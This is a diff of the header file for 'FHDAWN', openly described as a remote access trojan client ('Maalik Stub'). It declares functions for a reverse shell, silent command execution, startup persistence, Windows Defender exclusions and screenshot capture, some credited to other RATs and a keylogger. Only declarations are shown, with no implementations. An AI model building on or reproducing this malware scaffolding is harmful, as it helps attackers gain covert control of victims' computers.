@@ -1,79 +1,54 @@
+#ifndef __FHDAWN__H__
+#define __FHDAWN__H__
 /*
-
-FHDAWN - The Maalik Stub / Client
-- Execute as Administrator 
-- Add Exclusions to Install Directory
-- [x] Browse the System.
-
+Author: Fahad (QuantumCore)
+fhdawn.h (c) 2020
+Desc: Main header file 
+Created:  2020-08-15T15:27:04.427Z
+Modified: -
 */
 
-#ifndef FHDAWN_X
-#define FHDAWN_X
+#include <winsock2.h>
+#include <winsock.h>
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+#include <iphlpapi.h>
+#include <psapi.h>
+#include <wininet.h>
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "advapi32.lib")
 
 #define BUFFER 1024
-#define UNLEN 256
+static BOOL connected = FALSE;
 
-#include <winsock2.h>
-#include <algorithm>
-#include <tlhelp32.h>
-#include <psapi.h>
-#include <shlobj.h>
-#include <iostream>
-#include <tchar.h>
-#include <winerror.h>
-#include <sstream>
-#include <fstream>
-#include <string>
-#include <windows.h>
-#include <iphlpapi.h>
+struct sockaddr_in server;
+SOCKET sockfd;
+char recvbuf[BUFFER];
+//=====================
+void ReportError(void);
+void WSAReportError(void);
 
-static bool connected = false;
+int CaptureAnImage(HWND hWnd);
+void TimeStamp(char buffer[100]);
+BOOL IsAdmin();
+//=====================
+void sockprintf(SOCKET sock, const char* words, ...);
+BOOL isFile(const char* file);
+void UserPC();
+char* cDir();
+// Start Winsock
+void StartWSA(void);
+void fhdawn_main(void);
+void MainConnect(void);
+void sockSend(const char* data);
+DWORD ProcessId(LPCTSTR ProcessName);
+void ExecSock(void);
+void CheckHost(const char* ip_address);
+const char* IP2Host(const char* IP);
+void split(char* src, char* dest[5], const char* delimeter);
+void REConnect();
 
-void UACTrigger();
-
-class FHDAWN{
-    public:
-    std::string SCANIP;
-    int SCANPORT;
-    std::string Host = "";
-    std::string Port = "";
-    SOCKET sockfd;
-    std::string file_s;
-    WIN32_FIND_DATA data;
-    struct sockaddr_in server;
-    char recvbuf[BUFFER] = { 0 };
-    char fbuf[BUFFER] = { 0 } ;
-    void MainConnect();
-    void REConnect();
-    void fhdawn_main();
-    std::string OsInfo();
-    void ExecuteSilent(const char* command); // From Claw Keylogger 
-    void Execute(const char* file);
-    void ExecuteArgs(const char* file, const char* args);
-    void ReverseShell(const char* command); // Also from Claw Keylogger
-    std::string readFileContents(const char* file); // Also from Claw Keylogger
-    void send_data(std::string data);
-    std::string Dir();
-    void split(char* src, char* dest[5], const char* delimeter);
-    BOOL isFile(const char* file);
-    std::streampos filesize( const char* filePath );
-    std::string UserPC();
-    void copyFile(const char* source, const char* dest);
-    std::string initial_install_directory(); // From Claw Keylogger
-    void GetInformation(); // From Claw Keylogger
-    std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos); // From Claw Keylogger
-    std::string getLastLine(std::ifstream& in); // From Claw Keylogger
-    std::string MyLocation();  // From Claw Keylogger
-    void StartupKey(const char* czExePath); // From Claw Keylogger
-    BOOL IsAdmin();
-    DWORD ProcessId(LPCTSTR ProcessName);
-    void AddExclusion(const char* path); // Add Windows Defender Exclusion, From Prime RAT.
-    void ProcessMonitor(std::string Process);
-    void ReceiveFile();
-    void checkPort(const char* ip, int port);
-    std::string IP2Host(const char* IP);
-    void CheckHost(const char* ip_address);
-    std::string random_string(size_t length); // From Claw Keylogger
-};
-
-#endif
+#endif  //!__FHDAWN__H__
